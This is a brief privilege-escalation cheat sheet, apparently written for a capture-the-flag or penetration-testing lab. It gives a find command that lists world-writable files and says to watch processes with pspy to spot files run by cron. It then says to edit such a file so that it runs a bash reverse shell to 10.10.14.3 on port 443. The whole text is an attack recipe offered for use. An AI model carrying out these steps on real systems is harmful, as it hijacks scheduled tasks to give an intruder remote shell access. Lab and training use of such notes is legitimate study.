Find the Directories or Files running Cronjob
```find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null```
Run pspy to check whether the directory is running cronjob or not 

Check the contents of the file running cronjob and then modify it to include a rev shell
```bash -i >& /dev/tcp/10.10.14.3/443 0>&1```
